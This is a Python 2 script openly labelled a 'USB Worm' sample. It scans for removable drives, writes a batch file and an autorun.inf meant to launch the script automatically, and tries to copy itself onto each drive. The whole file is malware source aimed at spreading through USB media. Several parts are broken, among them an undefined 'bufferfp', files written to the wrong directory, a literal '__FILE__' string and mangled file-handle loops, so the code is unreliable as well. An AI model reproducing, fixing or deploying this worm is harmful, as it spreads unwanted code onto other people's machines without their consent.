import os, time
from datetime import datetime
startTime = time.time()
print """''''''''''''''''''''''''''''''
' USB Worm for Python Sample '
''''''''''''''''''''''''''''''
'                            '
'   Testing Version 0.06     '
'                            '
''''''''''''''''''''''''''''''
'   For Windows, OSX, Linux  '
''''''''''''''''''''''''''''''"""
#Simple USB Worm#
time.sleep(6)
def USBDetect():
	global textfile
	if os.name == 'posix':
		print "Found Unix, Linux, OSX, or Other POSIX System...\n"
		USBDir = ['/dev/sdb1', '/dev/sdb2', '/dev/sdb3', '/dev/sdc1', '/dev/sdc2', '/dev/sdc3']
		textfile = "\text.txt"
	else:
		if os.name == 'nt':
			print "Found Windows...\n"
			USBDir = ['E:\\', 'F:\\', 'G:\\', 'H:\\', 'I:\\']
			textfile = "text.txt"		
	lencount = len(USBDir)
	lencount -= 1
	global USBList
	USBList = []
	while lencount >= 0:
		time.sleep(2)
		if os.path.exists(USBDir[lencount]):
			USBList.append(USBDir[lencount])
			print "Found %s\n" % USBDir[lencount]
			lencount -= 1
		else:
			print "No USB Detected"
			lencount -= 1
USBDetect()
print "\nUSB's Detected: %s\n" % USBList

def AnyUSB():
	if USBList == []:
		print "No USB's Detected at this time...exiting...\n"
		finished = time.time() - startTime
		print "Time to execute worm: %s" % finished
		exit()
	else:
		print ""
AnyUSB()

def USBrw():
	USBCount = len(USBList)
	USBCount -= 1
	while USBCount >= 0:
		fullname = os.path.join(USBList[USBCount], textfile)
		try:
			fp = open(fullname, 'a')
			fp.close()
			print "Successfully Wrote File... %s" % USBList[USBCount]
			os.remove(fullname)
			USBCount -= 1
		except IOError:
			print "Permission Error Writing Test File... %s\n" % USBList[USBCount]
			USBCount -= 1
USBrw()
def WinBat():
	print "Running WinWorm Module...Will exit if not Windows...\n"
	time.sleep(2)
	USBCount = len(USBList)
	USBCount -= 1
	while USBCount >= 0:
		batch = 'my.bat'
		fullname = os.path.join(USBList[USBCount], batch)
		try:
			if os.name == 'nt':
				fp = open(batch, 'w+')
				time.sleep(1)
				command = "start C:\Python27\python.exe __FILE__"
				fp.write(command)
				fp.close
				USBCount -= 1
			else:
				print "Not Windows..."
				break
		except IOError:
			print "Permission Error Writing Test File... %s\n" % USBList[USBCount]
			USBCount -= 1
def WinAuto():
	USBCount = len(USBList)
	USBCount -= 1
	while USBCount >= 0:
		autorun = 'autorun.inf'
		fullname = os.path.join(USBList[USBCount], autorun)
		try:
			if os.name == 'nt':
				fp = open(autorun, 'w+')
				time.sleep(1)
				autow = '[autorun]'
				autow1 = 'open = my.bat'
				autow2 = 'action = Run my program'
				autow3 = 'icon = '
				fp.write(autow)
				fp.write('\n')
				fp.write(autow1)
				fp.write('\n')
				fp.write(autow2)
				fp.write('\n')
				fp.write(autow3)
				fp.close()
				USBCount -= 1

			else:
				print "Not Windows..."
				break
		except IOError:
			print "Permission Error Writing Test File... %s\n" % USBList[USBCount]
			USBCount -= 1
WinBat()
WinAuto()
def WinWorm():
	USBCount = len(USBList)
	USBCount -= 1
	while USBCount >= 0:
		me = __file__
		fullname = os.path.join(USBList[USBCount], me)
		try:
			if os.name == 'nt':
				fp = open(me, 'r')
				fp2 = open(fullname, 'w+')
				fp3 = open(bufferfp, 'w+')
				time.sleep(1)
				for data in fp.readlines():
					fp.close()
					fp3.write(data)
					for data2 in fp3.readlines():
						fp3.close()
						fp2.write(data2)
						fp2.close()
						USBCount -= 1
			else:
				print "Not Windows..."
				break
		except IOError:
			print "Permission Error Writing Test File... %s\n" % USBList[USBCount]
			USBCount -= 1
WinWorm()
finished = time.time() - startTime
print "Time to execute worm: %s" % finished
